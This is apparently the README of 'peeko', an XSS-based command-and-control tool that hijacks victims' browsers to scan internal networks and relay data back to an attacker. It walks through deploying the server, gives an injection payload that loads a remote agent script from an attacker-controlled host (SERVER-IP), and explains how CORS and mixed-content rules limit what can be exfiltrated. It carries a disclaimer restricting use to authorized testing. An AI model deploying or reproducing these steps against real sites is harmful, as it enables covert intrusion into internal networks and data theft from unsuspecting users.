# peeko

**Version:** v1.0

peeko is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.

Through an injected XSS payload, peeko establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, and exfiltrate data — all without dropping a single binary.

---

## Features

- WebSocket-based communication between attacker and multiple victims  
- Victim’s browser fetches internal URLs and scans IP ranges + ports  
- Simple control panel with:  
  - Victim selector  
  - Manual URL fetch  
  - IP and port range scanner  
  - Log viewer with copy/save functionality  
- Self-signed HTTPS support with auto-generated certificates  
- Lightweight: single Python file + static assets  

---

## Requirements

- Python 3.8+  
- OpenSSL  
- Linux/macOS (tested on Debian-based systems)  

---

## Quick Start

1. Clone the repository:

    ```bash
    git clone https://github.com/b3rito/peeko.git
    cd peeko
    ```

2. Install dependencies:

    ```bash
    make install
    ```

3. (Optional) Make scripts executable if needed:

    ```bash
    chmod +x gen-cert.sh start.sh
    ```

4. Generate a self-signed TLS certificate:

    ```bash
    make cert
    ```

5. Replace the `SERVER-IP` placeholder:

    Open the following files and replace all occurrences of `SERVER-IP` with the actual IP address or domain of your machine:

    - `static/agent.js`
    - `static/control.html`

    Example:

    ```javascript
    wss://SERVER-IP:8443/ws → wss://192.168.1.12:8443/ws
    ```

6. Run the server:

    ```bash
    make run
    ```

7. Open your browser and access the control panel:

    ```
    https://SERVER-IP:8443/static/control.html
    ```

8. Inject the XSS payload (example):

    ```html
    <script src="https://SERVER-IP:8443/static/agent.js"></script>
    ```
---

## Usage

### Control Panel

- Choose a connected victim from the dropdown  
- Input a manual URL to fetch via the victim  
- Specify an IP range (e.g. `192.168.1.10-20` or `192.168.1.0/24`) and ports (e.g. `80,8080,3000-3010`) to scan  
- Results will appear in the log viewer:  
  - HTTP status  
  - Body preview 
- You can copy the log or save it as `.txt` or `.json`  

---

### SERVER-IP Placeholder

In both `agent.js` and `control.html`, the WebSocket connection points to:

```javascript
wss://SERVER-IP:8443/ws
```

**Before deploying**, replace `SERVER-IP` with your actual IP address (e.g. `192.168.1.12` or a public IP/domain). This ensures the victim browser and control panel can communicate with your server over HTTPS.

---


## Project Structure

```
peeko/
├── main.py             → FastAPI WebSocket server  
├── start.sh            → Launch server  
├── gen-cert.sh         → Generate self-signed TLS certificate  
├── Makefile            → Install/run helpers  
├── requirements.txt    → Python dependencies  
├── certs/              → TLS key and cert will be stored here  
└── static/             → Browser client assets  
    ├── control.html    → Control panel (was attacker.html)  
    ├── infect.html     → Victim landing page  
    └── agent.js        → Victim agent script  
```

---

## Workflow

1. Inject the payload into a vulnerable web application  
2. Victim’s browser loads the agent and connects to your peeko server  
3. From the control panel, you issue commands to fetch URLs or scan targets  
4. peeko logs and returns the content of internal services  

---

## Use Cases

- Internal network exploration through browser footholds  
- LAN service enumeration from inside the victim’s network   

---

## CORS Behavior and Mixed Content Issues

peeko uses `fetch()` from within the victim’s browser to request internal web services. Modern browsers enforce **CORS (Cross-Origin Resource Sharing)** policies that determine whether the attacker can read the response.

### CORS Scenarios

| Response Header                           | Works? | Explanation                                                |
|-------------------------------------------|--------|------------------------------------------------------------|
| `Access-Control-Allow-Origin: *`          | ✅     | You can read the full response body and status code.       |
| *No* `Access-Control-Allow-Origin`        | ⚠️     | The request succeeds, but the response is opaque.          |
| Restrictive CORS (e.g., specific domains) | ❌     | The browser blocks the response or hides its contents.     |

### Mixed Content Issues

Because peeko’s connection to the victim’s browser is over **HTTPS**, attempting to fetch **HTTP** (non-secure) URLs may result in **mixed content errors**. In modern browsers, these errors prevent the browser from loading or reading the HTTP resource. This means:

- Even if a target HTTP service would respond with useful data, the victim’s browser will block or not expose that data to your script.
- peeko can only extract and relay content from services that are accessible over HTTPS.

### In Practice

During a penetration test, if you find an internal service that responds with `Access-Control-Allow-Origin: *` and is served over HTTPS, then peeko becomes a stealth proxy capable of exfiltrating internal data directly from the victim's browser without dropping any files or opening outbound connections.


---

## Disclaimer

This tool is provided for educational and authorized testing purposes only.  
Any use of peeko outside of environments where you have explicit permission is **strictly prohibited**.  
You are responsible for your own actions.

---

## Authors

Written by **b3rito** at mes3hacklab & **GioPpeTto**
